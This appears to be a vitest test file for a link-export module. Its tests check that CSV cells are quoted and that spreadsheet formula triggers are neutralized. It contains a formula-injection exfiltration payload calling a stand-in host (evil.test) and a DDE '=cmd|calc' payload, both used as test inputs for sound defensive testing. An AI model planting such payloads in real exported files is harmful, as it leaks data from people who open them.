import { describe, it, expect } from 'vitest'
import { escapeCsv, linksToCsv, linksToJson } from './export'
import type { Link } from './types'

function makeLink(overrides: Partial<Link> = {}): Link {
  return {
    id: 'id-1',
    url: 'https://example.com/a',
    title: 'A title',
    description: null,
    category: 'Coding',
    source: 'manual',
    sender_username: null,
    sender_message_context: null,
    original_timestamp: null,
    is_read: false,
    created_at: '2026-01-01T00:00:00.000Z',
    updated_at: '2026-01-01T00:00:00.000Z',
    ...overrides,
  }
}

describe('escapeCsv', () => {
  it('renders null/undefined as an empty cell', () => {
    expect(escapeCsv(null)).toBe('')
    expect(escapeCsv(undefined)).toBe('')
  })

  it('leaves plain text untouched', () => {
    expect(escapeCsv('hello world')).toBe('hello world')
  })

  it('quotes cells containing commas, quotes, or newlines', () => {
    expect(escapeCsv('a,b')).toBe('"a,b"')
    expect(escapeCsv('line1\nline2')).toBe('"line1\nline2"')
    expect(escapeCsv('say "hi"')).toBe('"say ""hi"""')
  })

  it('neutralizes formula triggers so spreadsheets treat them as text', () => {
    expect(escapeCsv('=1+1')).toBe("'=1+1")
    expect(escapeCsv('+SUM(A1)')).toBe("'+SUM(A1)")
    expect(escapeCsv('-2+3')).toBe("'-2+3")
    expect(escapeCsv('@SUM(A1)')).toBe("'@SUM(A1)")
  })

  it('neutralizes the classic exfiltration payload and still quotes it', () => {
    // Would otherwise fire a web request on open in Excel.
    const payload = '=HYPERLINK("http://evil.test?d="&A1,"click")'
    const cell = escapeCsv(payload)
    expect(cell.startsWith('"\'=')).toBe(true)
    expect(cell).toContain('""') // inner quotes doubled
  })

  it('only triggers on a leading character, not mid-string', () => {
    expect(escapeCsv('2+2 equals 4')).toBe('2+2 equals 4')
  })
})

describe('linksToCsv', () => {
  it('emits a header row followed by one row per link', () => {
    const csv = linksToCsv([makeLink(), makeLink({ id: 'id-2' })])
    const lines = csv.split('\n')
    expect(lines[0].startsWith('id,url,title')).toBe(true)
    expect(lines).toHaveLength(3)
  })

  it('escapes third-party message context safely', () => {
    const csv = linksToCsv([
      makeLink({ sender_message_context: '=cmd|calc!A1', description: 'has, comma' }),
    ])
    expect(csv).toContain("'=cmd|calc!A1")
    expect(csv).toContain('"has, comma"')
  })

  it('renders booleans and nulls', () => {
    const csv = linksToCsv([makeLink({ is_read: true, title: null })])
    const row = csv.split('\n')[1]
    expect(row).toContain('true')
    expect(row).toContain('id-1,https://example.com/a,,') // empty title cell
  })
})

describe('linksToJson', () => {
  it('wraps links with a count and export timestamp', () => {
    const parsed = JSON.parse(linksToJson([makeLink()]))
    expect(parsed.count).toBe(1)
    expect(parsed.links).toHaveLength(1)
    expect(parsed.links[0].url).toBe('https://example.com/a')
    expect(typeof parsed.exported_at).toBe('string')
  })

  it('does not apply CSV escaping to JSON values', () => {
    const parsed = JSON.parse(linksToJson([makeLink({ title: '=1+1' })]))
    expect(parsed.links[0].title).toBe('=1+1')
  })
})
